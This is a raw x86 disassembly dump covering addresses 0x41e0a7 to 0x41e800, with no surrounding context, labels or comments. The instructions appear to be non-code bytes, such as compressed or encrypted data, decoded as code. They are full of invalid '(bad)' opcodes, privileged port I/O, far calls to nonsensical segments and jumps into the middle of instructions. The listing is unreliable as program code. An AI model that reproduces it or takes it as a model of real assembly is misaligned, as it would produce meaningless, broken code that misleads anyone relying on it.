  41e0a7:	dec    ecx
  41e0a8:	aaa    
  41e0a9:	xor    BYTE PTR [esi-0x4cd0da59],dl
  41e0af:	xor    dh,BYTE PTR [esp+esi*1-0x2fa5d9ae]
  41e0b6:	repnz or esi,eax
  41e0b9:	loop   0x41e0b6
  41e0bb:	aad    0x70
  41e0bd:	adc    BYTE PTR ds:0xeb7f196a,ah
  41e0c3:	jo     0x41e06a
  41e0c5:	xchg   BYTE PTR [eax],dh
  41e0c7:	and    eax,0xe7684062
  41e0cc:	add    ebx,DWORD PTR [ecx+ecx*2+0x6043feb1]
  41e0d3:	sar    BYTE PTR [esi],0xa0
  41e0d6:	pop    esi
  41e0d7:	push   edx
  41e0d8:	js     0x41e06b
  41e0da:	push   eax
  41e0db:	sar    BYTE PTR [eax],cl
  41e0dd:	xchg   ecx,eax
  41e0de:	add    eax,0xd3354c36
  41e0e3:	jns    0x41e08a
  41e0e5:	xchg   ecx,eax
  41e0e6:	mov    dh,0x6e
  41e0e8:	or     DWORD PTR [edx-0x543c5ef6],edi
  41e0ee:	sub    dh,0x5
  41e0f1:	retf   0x996
  41e0f4:	mov    ah,0x83
  41e0f6:	mov    ds:0x3aad427e,al
  41e0fb:	ss popa 
  41e0fd:	fnstenv [eax]
  41e0ff:	das    
  41e100:	fdivr  st(5),st
  41e102:	sbb    DWORD PTR [ebx-0x26],edi
  41e105:	test   DWORD PTR [esi-0x638d42ec],0xba90edef
  41e10f:	shl    BYTE PTR [eax+0x6430c4fe],0x80
  41e116:	add    cl,cl
  41e118:	mov    bl,0x6b
  41e11a:	add    DWORD PTR [ecx],esi
  41e11c:	xor    eax,0x68502361
  41e121:	(bad)  
  41e122:	dec    edx
  41e123:	cmp    DWORD PTR [eax+0x16e175c5],edi
  41e129:	xor    esp,0x12
  41e12c:	and    eax,0xc5d4ce30
  41e131:	scas   al,BYTE PTR es:[edi]
  41e132:	dec    eax
  41e133:	gs mov ebx,0x8f3176ad
  41e139:	hlt    
  41e13a:	(bad)  
  41e13b:	mov    ch,0xba
  41e13d:	outs   dx,BYTE PTR ds:[esi]
  41e13e:	jmp    0xd90be93d
  41e143:	and    ebp,ebp
  41e145:	out    dx,eax
  41e146:	or     eax,0xac387c6c
  41e14b:	sub    cl,ah
  41e14d:	mov    edx,0x936f2775
  41e152:	sub    bl,BYTE PTR [ebx-0x62]
  41e155:	mov    ebx,0x6c1b4e4c
  41e15a:	cmp    edi,edi
  41e15c:	sbb    cl,bh
  41e15e:	pop    esp
  41e15f:	scas   al,BYTE PTR es:[edi]
  41e160:	frstor [eax]
  41e162:	sub    BYTE PTR [esi],bl
  41e164:	fimul  WORD PTR [ebx]
  41e166:	popf   
  41e167:	mov    ds:0x40221af,al
  41e16c:	xchg   ebp,eax
  41e16d:	sub    BYTE PTR ds:0xd5eaabe9,bh
  41e173:	xor    bh,0x3c
  41e176:	pushw  ds
  41e178:	test   DWORD PTR [ebp-0x682c5e51],ebp
  41e17e:	ret    0xea14
  41e181:	xchg   BYTE PTR [ebp-0x5e71e51a],bh
  41e187:	mov    al,ds:0x662e9bfa
  41e18c:	adc    eax,0x97415507
  41e191:	icebp  
  41e192:	mov    ah,0x40
  41e194:	jb     0x41e1b3
  41e196:	or     DWORD PTR [ecx+0x18],esi
  41e199:	jns    0x41e182
  41e19b:	mov    esp,0x3e0920e8
  41e1a0:	mov    bh,0x98
  41e1a2:	push   ss
  41e1a3:	ins    BYTE PTR es:[edi],dx
  41e1a4:	mov    dh,0xc7
  41e1a6:	das    
  41e1a7:	mov    ebp,DWORD PTR [edx-0x72]
  41e1aa:	xor    esi,ecx
  41e1ac:	xchg   BYTE PTR [esi+0x3e],ah
  41e1af:	jno    0x41e1ac
  41e1b1:	in     al,dx
  41e1b2:	xor    dl,ch
  41e1b4:	dec    ecx
  41e1b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1b6:	xlat   BYTE PTR ds:[ebx]
  41e1b7:	iret   
  41e1b8:	gs sub al,0x67
  41e1bb:	and    DWORD PTR [ebp-0x23],ecx
  41e1be:	test   al,0xec
  41e1c0:	xor    al,0x12
  41e1c2:	push   edi
  41e1c3:	and    bh,cl
  41e1c5:	scas   al,BYTE PTR es:[edi]
  41e1c6:	es inc ecx
  41e1c8:	add    edx,DWORD PTR [esi-0x39]
  41e1cb:	push   ebp
  41e1cc:	mov    al,0x16
  41e1ce:	cmp    esp,DWORD PTR [edi]
  41e1d0:	mov    BYTE PTR [eax+esi*2],al
  41e1d3:	mov    ds:0x4f114b5a,al
  41e1d8:	rol    BYTE PTR [ebx+0x37],1
  41e1db:	mov    ch,0x61
  41e1dd:	mov    bh,0x5
  41e1df:	mov    bl,0x3a
  41e1e1:	dec    edx
  41e1e2:	cmp    edx,edx
  41e1e4:	int3   
  41e1e5:	ins    BYTE PTR es:[edi],dx
  41e1e6:	pop    ds
  41e1e7:	xor    DWORD PTR [ebx],ebp
  41e1e9:	mov    ch,0x29
  41e1eb:	inc    edx
  41e1ec:	inc    ebx
  41e1ed:	mov    ecx,0xc8f58a5f
  41e1f2:	push   ds
  41e1f3:	add    eax,DWORD PTR [ecx+0x7c]
  41e1f6:	adc    ah,BYTE PTR [edx+0x6c3e437e]
  41e1fc:	fist   WORD PTR [edi]
  41e1fe:	aas    
  41e1ff:	arpl   dx,di
  41e201:	mov    DWORD PTR [edx+0x76],eax
  41e204:	sbb    BYTE PTR [edx],dh
  41e206:	ficomp DWORD PTR [ebx]
  41e208:	bound  esp,QWORD PTR [edi+0x62]
  41e20b:	xor    esp,ecx
  41e20d:	mov    bh,0x1f
  41e20f:	xor    eax,0xb735bb9d
  41e214:	rol    BYTE PTR [eax],1
  41e216:	inc    ecx
  41e217:	shl    DWORD PTR [esi],1
  41e219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e21a:	in     al,0x3e
  41e21c:	sbb    al,0x66
  41e21e:	cmp    DWORD PTR [ecx-0x5a6109af],edx
  41e224:	jb     0x41e1d5
  41e226:	jle    0x41e1bd
  41e228:	jne    0x41e273
  41e22a:	mov    bl,0xf0
  41e22c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e22d:	jmp    0x41e22f
  41e22f:	fadd   st(6),st
  41e231:	rcl    BYTE PTR [ecx+0x61],0x38
  41e235:	mov    dh,0xe9
  41e237:	enter  0x594c,0x5
  41e23b:	and    esi,DWORD PTR [ebp-0x1e95b9ec]
  41e241:	push   0xd54a6b1b
  41e246:	xchg   DWORD PTR [ebp-0x1b],eax
  41e249:	sbb    eax,0x1cb4ca92
  41e24e:	add    BYTE PTR [ebx-0x50],al
  41e251:	inc    esp
  41e252:	add    eax,0xf629e0b3
  41e258:	daa    
  41e259:	xchg   BYTE PTR [esi-0x380dc7c6],al
  41e25f:	outs   dx,BYTE PTR ds:[esi]
  41e260:	ins    BYTE PTR es:[edi],dx
  41e261:	xchg   DWORD PTR [edx],ecx
  41e263:	xchg   ecx,eax
  41e264:	ins    BYTE PTR es:[edi],dx
  41e265:	adc    BYTE PTR [eax+0x12bafd17],al
  41e26b:	xchg   ebp,eax
  41e26c:	inc    ecx
  41e26d:	sub    BYTE PTR [edi],bl
  41e26f:	daa    
  41e270:	fdivr  DWORD PTR [edx-0x25]
  41e273:	fisttp WORD PTR [edi-0x6c9114fa]
  41e279:	sti    
  41e27a:	ja     0x41e254
  41e27c:	aam    0xc
  41e27e:	retf   0x9a80
  41e281:	fdivr  st(0),st
  41e283:	inc    ecx
  41e284:	call   0xc66f57f7
  41e289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e28a:	mov    ch,0x67
  41e28c:	sbb    BYTE PTR [ecx-0x14d4cb87],al
  41e292:	add    eax,0x438a4cea
  41e297:	adc    esi,ebp
  41e299:	inc    eax
  41e29a:	xor    al,BYTE PTR [edx]
  41e29c:	or     eax,0xd1252c5c
  41e2a1:	mov    cl,0x30
  41e2a3:	sbb    eax,0x587995b0
  41e2a8:	xor    al,0xd5
  41e2aa:	fbld   TBYTE PTR [eax-0x74]
  41e2ad:	fld    DWORD PTR [esi+0x79adc465]
  41e2b3:	enter  0xe7e5,0x91
  41e2b7:	loop   0x41e282
  41e2b9:	add    BYTE PTR [edx+0x21ba70e8],cl
  41e2bf:	xor    al,0x3d
  41e2c1:	mov    esp,0xf65f0cab
  41e2c6:	or     cl,BYTE PTR [edx]
  41e2c8:	jbe    0x41e296
  41e2ca:	adc    al,0xff
  41e2cc:	mov    ds:0x3f4d0343,eax
  41e2d1:	push   ebx
  41e2d2:	or     al,BYTE PTR [esi]
  41e2d4:	(bad)  
  41e2d5:	xor    dh,BYTE PTR [esi]
  41e2d7:	add    DWORD PTR ds:0x4dd528d4,ebx
  41e2dd:	leave  
  41e2de:	inc    esp
  41e2df:	push   cs
  41e2e0:	push   es
  41e2e1:	push   0xffffffb8
  41e2e3:	or     cl,BYTE PTR [esi+0x30]
  41e2e6:	seta   dh
  41e2e9:	retf   
  41e2ea:	cmp    al,0xb8
  41e2ec:	ja     0x41e346
  41e2ee:	add    DWORD PTR [edx-0x46],ebx
  41e2f1:	adc    BYTE PTR [esi-0x71019a98],0x76
  41e2f8:	add    BYTE PTR [eax-0x53c722b3],ah
  41e2fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ff:	push   edx
  41e300:	dec    ebp
  41e301:	jecxz  0x41e28a
  41e303:	pop    ds
  41e304:	xchg   edi,eax
  41e305:	mov    ebx,0x7bfb835c
  41e30a:	lds    esi,FWORD PTR [edi+0x1d]
  41e30d:	dec    esi
  41e30e:	sbb    BYTE PTR [ecx],dl
  41e310:	ror    DWORD PTR [ecx+0x19],1
  41e313:	fcomip st,st(2)
  41e315:	inc    eax
  41e316:	repnz aas 
  41e318:	neg    BYTE PTR [ecx-0x1b]
  41e31b:	mov    ds:0xefdbfb30,eax
  41e320:	popf   
  41e321:	adc    bl,BYTE PTR [edi-0xa]
  41e324:	xchg   DWORD PTR [ecx],ecx
  41e326:	icebp  
  41e327:	push   eax
  41e328:	xor    eax,0xf6adcd95
  41e32d:	(bad)  
  41e32e:	stos   DWORD PTR es:[edi],eax
  41e32f:	test   al,0x79
  41e331:	xor    eax,0xf418957
  41e336:	jp     0x41e2bb
  41e338:	mov    dl,ch
  41e33a:	and    BYTE PTR [ebp-0x4128712e],dh
  41e340:	(bad)  
  41e341:	jnp    0x41e34d
  41e343:	inc    esp
  41e344:	js     0x41e36b
  41e346:	add    al,0xe4
  41e348:	js     0x41e391
  41e34a:	adc    eax,DWORD PTR [edi]
  41e34c:	gs pop ebp
  41e34e:	xlat   BYTE PTR ds:[ebx]
  41e34f:	sub    al,0x23
  41e351:	cli    
  41e352:	and    DWORD PTR [ebx+0x67],ecx
  41e355:	ror    BYTE PTR [ebx+0x35],1
  41e358:	push   es
  41e359:	add    DWORD PTR [edi],esi
  41e35b:	push   0x3a
  41e35d:	adc    eax,0xc77fdba6
  41e362:	repz dec ebx
  41e364:	fsub   QWORD PTR [ecx]
  41e366:	test   BYTE PTR [ebx+0x467b75c6],dl
  41e36c:	stos   DWORD PTR es:[edi],eax
  41e36d:	je     0x41e305
  41e36f:	xor    dl,BYTE PTR [ebx]
  41e371:	inc    esi
  41e372:	fs (bad) 
  41e374:	jg     0x41e38e
  41e376:	aad    0xa8
  41e378:	dec    eax
  41e379:	dec    ecx
  41e37a:	mov    cl,0x6b
  41e37c:	stc    
  41e37d:	inc    esp
  41e37e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e37f:	repnz mov cl,0x28
  41e382:	mov    bh,0xf2
  41e384:	mov    ds:0xd098f3fa,eax
  41e389:	mov    bh,0xc5
  41e38b:	pop    ss
  41e38c:	in     eax,0xe0
  41e38e:	pop    ebx
  41e38f:	or     ebp,DWORD PTR [ebp+0xbeb4d92]
  41e395:	lds    esi,FWORD PTR [edi-0x3f]
  41e398:	push   ecx
  41e399:	jae    0x41e336
  41e39b:	push   edx
  41e39c:	lock (bad) 
  41e39e:	cmp    ah,BYTE PTR [eax-0x6]
  41e3a1:	test   BYTE PTR [edx-0x3c4de95],dh
  41e3a7:	sbb    DWORD PTR [eax],0x2d
  41e3aa:	js     0x41e354
  41e3ac:	int3   
  41e3ad:	mov    esp,0x406666db
  41e3b2:	(bad)  
  41e3b3:	xlat   BYTE PTR ds:[ebx]
  41e3b4:	lods   eax,DWORD PTR ds:[esi]
  41e3b5:	enter  0x5fee,0xc2
  41e3b9:	adc    dh,BYTE PTR [edi]
  41e3bb:	mov    ecx,0x17613c5a
  41e3c0:	dec    edx
  41e3c1:	std    
  41e3c2:	sub    DWORD PTR [edi+0x6baf46b3],edx
  41e3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3c9:	xchg   ecx,eax
  41e3ca:	sub    DWORD PTR [esi-0x317e1543],esi
  41e3d0:	mov    ecx,DWORD PTR [eax+0x580dece8]
  41e3d6:	xor    al,0xd8
  41e3d8:	loopne 0x41e3b8
  41e3da:	push   0xaac9f11b
  41e3df:	fcmovnb st,st(4)
  41e3e1:	scas   al,BYTE PTR es:[edi]
  41e3e2:	lods   eax,DWORD PTR ds:[esi]
  41e3e3:	aad    0xca
  41e3e5:	or     BYTE PTR [ecx],dh
  41e3e7:	xor    ebx,DWORD PTR [esi+0x3910e3b]
  41e3ed:	push   edi
  41e3ee:	xor    DWORD PTR [esi+0x59],ecx
  41e3f1:	data16 xor BYTE PTR [eax],0xa4
  41e3f5:	sub    DWORD PTR [eax],edx
  41e3f7:	fstp   DWORD PTR [eax+0x9360ef7]
  41e3fd:	icebp  
  41e3fe:	aaa    
  41e3ff:	aad    0xd5
  41e401:	jp     0x41e38f
  41e403:	out    0xbd,eax
  41e405:	sbb    BYTE PTR [esi+0x78],bh
  41e408:	lahf   
  41e409:	int    0x22
  41e40b:	and    eax,0x9e27d824
  41e410:	pop    ds
  41e411:	stos   DWORD PTR es:[edi],eax
  41e412:	popf   
  41e413:	pop    ds
  41e414:	mov    edx,0xa8d2bdd2
  41e419:	sub    BYTE PTR ds:0xd9cf51af,bh
  41e41f:	fld    DWORD PTR [ebx+0x32f5bd4b]
  41e425:	mov    ebp,DWORD PTR [edi]
  41e427:	out    0x49,eax
  41e429:	inc    edi
  41e42a:	shr    DWORD PTR [edx],1
  41e42c:	cmp    eax,edi
  41e42e:	or     ch,BYTE PTR [ecx-0x36]
  41e431:	pop    eax
  41e432:	dec    eax
  41e433:	icebp  
  41e434:	xor    dh,BYTE PTR [esi+edi*4]
  41e437:	pop    esi
  41e438:	dec    edx
  41e439:	sub    BYTE PTR [esi-0x70],bh
  41e43c:	add    esi,ecx
  41e43e:	rcl    DWORD PTR [ecx],1
  41e440:	xlat   BYTE PTR ds:[ebx]
  41e441:	in     al,dx
  41e442:	pop    edi
  41e443:	dec    edi
  41e444:	test   ebx,esp
  41e446:	cmc    
  41e447:	mov    ch,0x13
  41e449:	xor    al,0xe4
  41e44b:	clc    
  41e44c:	imul   eax,ebp,0xde4b15aa
  41e452:	jnp    0x41e40d
  41e454:	stos   DWORD PTR es:[edi],eax
  41e455:	test   BYTE PTR [ebx+0x49],cl
  41e458:	cmp    eax,0x39450976
  41e45d:	and    eax,0xee318404
  41e462:	cmc    
  41e463:	push   es
  41e464:	mov    ss,WORD PTR [eax]
  41e466:	jmp    0x41e416
  41e468:	jbe    0x41e4c5
  41e46a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e46b:	popf   
  41e46c:	sbb    bl,BYTE PTR [ebp-0x12]
  41e46f:	sets   BYTE PTR [ecx]
  41e472:	das    
  41e473:	xchg   DWORD PTR [ebp+0x25fe17b8],ebx
  41e479:	nop
  41e47a:	ss jge 0x41e46b
  41e47d:	inc    ebp
  41e47e:	mov    al,ds:0x87263d76
  41e483:	mov    DWORD PTR [edi-0x4e010041],edx
  41e489:	sbb    al,0x9a
  41e48b:	iret   
  41e48c:	ja     0x41e497
  41e48e:	add    BYTE PTR [eax],bh
  41e490:	fild   WORD PTR [eax+0x0]
  41e493:	hlt    
  41e494:	sbb    DWORD PTR [edi+eax*1],0x9771f90d
  41e49b:	xor    ebp,DWORD PTR [ebp+0x531264b1]
  41e4a1:	into   
  41e4a2:	dec    ecx
  41e4a3:	mov    ah,0xe5
  41e4a5:	and    ah,BYTE PTR [ebx+0x5e]
  41e4a8:	lahf   
  41e4a9:	lahf   
  41e4aa:	stc    
  41e4ab:	and    cl,BYTE PTR [edx]
  41e4ad:	or     esi,DWORD PTR [ebx-0x80]
  41e4b0:	sbb    ch,BYTE PTR [ecx]
  41e4b2:	lods   al,BYTE PTR ds:[esi]
  41e4b3:	das    
  41e4b4:	sub    eax,0xfc0e3f79
  41e4b9:	mov    bh,0x86
  41e4bb:	frstor [esp+eiz*4-0x3952ea15]
  41e4c2:	scas   al,BYTE PTR es:[edi]
  41e4c3:	(bad)  
  41e4c4:	pop    edx
  41e4c5:	xchg   edi,eax
  41e4c6:	push   ds
  41e4c7:	push   edi
  41e4c8:	aad    0x25
  41e4ca:	int    0x14
  41e4cc:	shl    DWORD PTR [esi+esi*1+0x6555854],cl
  41e4d3:	(bad)  
  41e4d4:	int3   
  41e4d5:	jno    0x41e478
  41e4d7:	xchg   ebx,eax
  41e4d8:	pop    bp
  41e4da:	pusha  
  41e4db:	(bad)  
  41e4dc:	pop    edi
  41e4dd:	dec    edx
  41e4de:	out    0xb4,eax
  41e4e0:	rcr    BYTE PTR [ebp+edi*8+0x66],0xfa
  41e4e5:	pop    ecx
  41e4e6:	jb     0x41e469
  41e4e8:	je     0x41e470
  41e4ea:	outs   dx,DWORD PTR ds:[esi]
  41e4eb:	enter  0xc942,0x8e
  41e4ef:	fucom  st(1)
  41e4f1:	xchg   edi,eax
  41e4f2:	cmc    
  41e4f3:	daa    
  41e4f4:	(bad)  
  41e4f5:	fsub   st(0),st
  41e4f7:	push   0xe1a78d94
  41e4fc:	fld    QWORD PTR [ecx]
  41e4fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4ff:	push   ebp
  41e500:	ins    DWORD PTR es:[edi],dx
  41e501:	(bad)  
  41e502:	(bad)  [ebx]
  41e504:	xchg   ecx,eax
  41e505:	push   es
  41e506:	pop    esp
  41e507:	and    eax,0xdb72274a
  41e50c:	cld    
  41e50d:	lock xor eax,0x14fe88d3
  41e513:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e514:	fwait
  41e515:	cmp    DWORD PTR [edi-0x1a],edx
  41e518:	pop    edi
  41e519:	dec    eax
  41e51a:	fld    QWORD PTR [ebp+edx*8-0x35]
  41e51e:	repnz mov esi,0xdca1f52b
  41e524:	mov    al,0x33
  41e526:	fwait
  41e527:	sub    dl,bh
  41e529:	push   edi
  41e52a:	popa   
  41e52b:	ins    DWORD PTR es:[edi],dx
  41e52c:	cmovo  eax,DWORD PTR [ecx+edi*2-0x63]
  41e531:	mov    al,0x81
  41e533:	push   eax
  41e534:	imul   eax,edi,0x4723c451
  41e53a:	outs   dx,DWORD PTR ds:[esi]
  41e53b:	pushf  
  41e53c:	enter  0x1706,0x86
  41e540:	cdq    
  41e541:	xchg   ecx,eax
  41e542:	scas   al,BYTE PTR es:[edi]
  41e543:	fiadd  WORD PTR [eax+0x70]
  41e546:	(bad)  
  41e547:	shr    BYTE PTR [esi],0x1a
  41e54a:	pop    es
  41e54b:	push   esi
  41e54c:	arpl   WORD PTR [esi+0x5a867f11],sp
  41e552:	jnp    0x41e540
  41e554:	inc    eax
  41e555:	addr16 mov al,0x23
  41e558:	test   BYTE PTR [ecx-0x45],0xc3
  41e55c:	in     eax,0x9f
  41e55e:	xchg   esi,eax
  41e55f:	cmp    eax,0xed3202c8
  41e564:	push   edi
  41e565:	mov    edi,DWORD PTR [esi]
  41e567:	or     BYTE PTR ds:0xaf61df54,dh
  41e56d:	and    DWORD PTR [edi+0xa],esi
  41e570:	or     al,BYTE PTR [ecx+0x39]
  41e573:	or     ch,BYTE PTR ds:0xe542ca49
  41e579:	push   ds
  41e57a:	dec    eax
  41e57b:	shl    BYTE PTR [edx-0x4e],1
  41e57e:	(bad)  
  41e57f:	repz jecxz 0x41e51b
  41e582:	adc    eax,0xb90e7bd0
  41e587:	in     eax,dx
  41e588:	ins    BYTE PTR es:[edi],dx
  41e589:	xchg   BYTE PTR ds:0x22361aa8,ch
  41e58f:	mov    ah,0x1d
  41e591:	imul   ebx,edi,0x7
  41e594:	push   ebx
  41e595:	cmp    ah,bl
  41e597:	popa   
  41e598:	mov    al,0xa4
  41e59a:	cld    
  41e59b:	or     ch,BYTE PTR [eax-0x5d]
  41e59e:	xor    dh,BYTE PTR [esi]
  41e5a0:	stos   BYTE PTR es:[edi],al
  41e5a1:	out    0x7a,eax
  41e5a3:	icebp  
  41e5a4:	mov    esi,0x65583fab
  41e5a9:	in     al,0x89
  41e5ab:	(bad)  
  41e5ac:	jne    0x41e57e
  41e5ae:	mov    ebp,0x61b793e2
  41e5b3:	sub    dh,al
  41e5b5:	and    eax,0x55dee689
  41e5ba:	inc    edi
  41e5bb:	out    0xe4,al
  41e5bd:	inc    ebp
  41e5be:	jge    0x41e60d
  41e5c0:	test   eax,0xf7ccf404
  41e5c5:	sar    DWORD PTR [ecx-0x57],1
  41e5c8:	adc    al,0x42
  41e5ca:	mov    ds:0x764d1d29,eax
  41e5cf:	mov    al,0xe1
  41e5d1:	xlat   BYTE PTR ds:[ebx]
  41e5d2:	pop    ecx
  41e5d3:	scas   al,BYTE PTR es:[edi]
  41e5d4:	test   ebx,edi
  41e5d6:	xor    bh,BYTE PTR [ebx]
  41e5d8:	test   al,0xab
  41e5da:	dec    edi
  41e5db:	and    DWORD PTR [edx+0x784e60e8],eax
  41e5e1:	popf   
  41e5e2:	adc    DWORD PTR [eax],0xd84b4b26
  41e5e8:	and    esi,edx
  41e5ea:	das    
  41e5eb:	out    0x67,eax
  41e5ed:	shl    BYTE PTR [ecx],1
  41e5ef:	and    eax,0xd1289038
  41e5f4:	pop    ss
  41e5f5:	adc    eax,0x7ca0b74
  41e5fa:	adc    ebp,DWORD PTR [edx+0x74151cf2]
  41e600:	adc    DWORD PTR [eax+0x64],0xffffff89
  41e604:	xor    edi,DWORD PTR [edi+0x7]
  41e607:	inc    esi
  41e608:	int    0xfc
  41e60a:	xor    bh,BYTE PTR [edx+0xa]
  41e60d:	mov    ebp,0x19740d31
  41e612:	pushf  
  41e613:	jle    0x41e5b2
  41e615:	push   ecx
  41e616:	cmp    cl,BYTE PTR [ebx+0x39]
  41e619:	inc    esi
  41e61a:	fmul   DWORD PTR [edi+eiz*4+0x55fb561b]
  41e621:	and    edi,esi
  41e623:	inc    eax
  41e624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e625:	add    al,0x27
  41e627:	pop    esi
  41e628:	pop    ecx
  41e629:	into   
  41e62a:	xor    ecx,DWORD PTR [ebx-0x5df83a36]
  41e630:	retf   0x3c17
  41e633:	jno    0x41e681
  41e635:	leave  
  41e636:	aam    0xfe
  41e638:	adc    eax,0x5489851e
  41e63d:	dec    eax
  41e63e:	adc    BYTE PTR [ebp-0x7f],al
  41e641:	imul   ebp,DWORD PTR [ebp+0x26],0xc0fb7b84
  41e648:	sub    eax,0xc7f46eeb
  41e64d:	bound  esp,QWORD PTR [edi+0x6c0ae629]
  41e653:	pop    esi
  41e654:	repnz jecxz 0x41e60f
  41e657:	sub    al,0x5d
  41e659:	sbb    cl,BYTE PTR [edi+0x70d52796]
  41e65f:	and    dl,cl
  41e661:	imul   ecx,edi,0x940ecf8b
  41e667:	xor    al,0x1
  41e669:	mov    bl,0xec
  41e66b:	push   es
  41e66c:	rcr    BYTE PTR [ebx-0x50cef4f1],0x65
  41e673:	ins    DWORD PTR es:[edi],dx
  41e674:	xor    DWORD PTR [edi+eax*8],ecx
  41e677:	js     0x41e67c
  41e679:	jne    0x41e687
  41e67b:	inc    ecx
  41e67c:	sbb    DWORD PTR [eax],esi
  41e67e:	fld    DWORD PTR [esi+0x15]
  41e681:	imul   ebp,DWORD PTR [edx+0x7309d935],0x4
  41e688:	adc    esi,esp
  41e68a:	mov    gs,WORD PTR ds:0xc922f5c4
  41e690:	jne    0x41e700
  41e692:	or     bh,BYTE PTR [ebx]
  41e694:	pop    eax
  41e695:	outs   dx,BYTE PTR es:[esi]
  41e697:	xor    eax,0x160eb0a5
  41e69c:	adc    eax,0x413a7c05
  41e6a1:	mov    ds:0x90fa9610,al
  41e6a6:	jo     0x41e6fc
  41e6a8:	jne    0x41e647
  41e6aa:	mov    ebx,0x1b021bcd
  41e6af:	sbb    ecx,DWORD PTR [edi]
  41e6b1:	adc    esi,esi
  41e6b3:	sub    BYTE PTR [edi-0x1e],0x98
  41e6b7:	and    DWORD PTR [ecx-0x72],ebp
  41e6ba:	cdq    
  41e6bb:	cdq    
  41e6bc:	jbe    0x41e722
  41e6be:	stos   BYTE PTR es:[edi],al
  41e6bf:	into   
  41e6c0:	xor    esi,edx
  41e6c2:	sub    BYTE PTR [ebx],cl
  41e6c4:	push   0xca4a9a17
  41e6c9:	sahf   
  41e6ca:	xlat   BYTE PTR ds:[ebx]
  41e6cb:	push   ds
  41e6cc:	or     al,0xae
  41e6ce:	or     al,0x68
  41e6d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d1:	jmp    0x108601ed
  41e6d6:	adc    BYTE PTR fs:[eax+eax*1+0x6f],al
  41e6db:	icebp  
  41e6dc:	aas    
  41e6dd:	push   cs
  41e6de:	leave  
  41e6df:	push   es
  41e6e0:	fimul  WORD PTR [ecx+edx*2]
  41e6e3:	stos   DWORD PTR es:[edi],eax
  41e6e4:	data16 fucomip st,st(4)
  41e6e7:	(bad)  
  41e6e8:	(bad)  
  41e6e9:	cmp    edx,edx
  41e6eb:	loope  0x41e768
  41e6ed:	xor    bl,ah
  41e6ef:	xor    DWORD PTR [edi+esi*4-0x1fef2b3f],eax
  41e6f6:	xor    eax,0x15c51d40
  41e6fb:	and    bh,dl
  41e6fd:	inc    esp
  41e6fe:	dec    esi
  41e6ff:	outs   dx,DWORD PTR ds:[esi]
  41e700:	pop    ecx
  41e701:	imul   ecx
  41e703:	xor    edi,DWORD PTR [edi-0x326486ea]
  41e709:	pop    edx
  41e70a:	add    BYTE PTR [edi-0x78afe35a],bh
  41e710:	mov    eax,ds:0x98f573be
  41e715:	into   
  41e716:	push   ebp
  41e717:	mov    ebp,0x8b323cf
  41e71c:	jno    0x41e79d
  41e71e:	lock xor BYTE PTR [edi+0x7a],bh
  41e722:	mov    DWORD PTR [ebp-0x46],ebx
  41e725:	xchg   ecx,eax
  41e726:	(bad)  
  41e727:	and    bh,BYTE PTR ds:0xaf6fe3b9
  41e72d:	fs inc ebp
  41e72f:	in     al,0x6e
  41e731:	mov    ecx,0x89e212c2
  41e736:	pusha  
  41e737:	pusha  
  41e738:	push   edx
  41e739:	sub    ch,BYTE PTR [esi+ebp*1-0x3]
  41e73d:	mov    ch,0xde
  41e73f:	rcl    edi,1
  41e741:	sbb    al,0x3a
  41e743:	mov    ch,0x5e
  41e745:	sub    al,0x5c
  41e747:	cmp    DWORD PTR [edi+ebp*1-0x49ef9d56],edx
  41e74e:	ins    BYTE PTR es:[edi],dx
  41e74f:	xlat   BYTE PTR ds:[ebx]
  41e750:	mov    esi,0x9a865577
  41e755:	(bad)  
  41e756:	push   eax
  41e757:	test   DWORD PTR ds:0x2744ec5c,esi
  41e75d:	enter  0xaab3,0x39
  41e761:	mov    ecx,0x93ff0a08
  41e766:	xchg   BYTE PTR ds:0x94463ea6,ah
  41e76c:	shr    DWORD PTR [edi+0x54],cl
  41e76f:	xor    edx,DWORD PTR [edi+0x27ae876f]
  41e775:	iret   
  41e776:	enter  0x525b,0x3d
  41e77a:	out    0x25,al
  41e77c:	loopne 0x41e791
  41e77e:	movq   QWORD PTR [edi+0xe],mm4
  41e782:	inc    ecx
  41e783:	jmp    0xdfd09b34
  41e788:	(bad)  
  41e789:	xchg   edi,eax
  41e78a:	aad    0x6f
  41e78c:	jae    0x41e7e5
  41e78e:	clc    
  41e78f:	mov    eax,0xfb142eee
  41e794:	ja     0x41e79f
  41e796:	pushf  
  41e797:	sub    esp,ebp
  41e799:	out    0xa5,eax
  41e79b:	pop    es
  41e79c:	bound  esp,QWORD PTR [ecx]
  41e79e:	and    BYTE PTR [ebp-0x5104aac0],bl
  41e7a4:	or     eax,0xee613dec
  41e7a9:	mov    eax,ds:0x5c3605b5
  41e7ae:	fbstp  TBYTE PTR [eax]
  41e7b0:	(bad)  
  41e7b1:	fwait
  41e7b2:	dec    ebp
  41e7b3:	cmp    dl,BYTE PTR [ecx-0x74c4f3af]
  41e7b9:	mov    dh,0x81
  41e7bb:	int3   
  41e7bc:	sbb    DWORD PTR [edi],ebx
  41e7be:	jnp    0x41e82b
  41e7c0:	call   0x6d4b:0x533bdc4a
  41e7c7:	shl    BYTE PTR [ebx],0x22
  41e7ca:	in     al,0xd7
  41e7cc:	pop    edx
  41e7cd:	xor    al,0x7
  41e7cf:	dec    ebx
  41e7d0:	call   0x6d44:0x7ab4bc6a
  41e7d7:	or     BYTE PTR [eax+0x52933758],0x26
  41e7de:	adc    DWORD PTR [ebp-0xec09664],0x71
  41e7e5:	call   0x5b5055c6
  41e7ea:	js     0x41e7b1
  41e7ec:	jbe    0x41e7ab
  41e7ee:	scas   eax,DWORD PTR es:[edi]
  41e7ef:	sub    eax,0xc7aa2ad0
  41e7f4:	pusha  
  41e7f5:	fcmovu st,st(3)
  41e7f7:	out    dx,al
  41e7f8:	fistp  WORD PTR [esp+edi*8]
  41e7fb:	mov    eax,0x9f769476
  41e800:	xchg   esi,eax
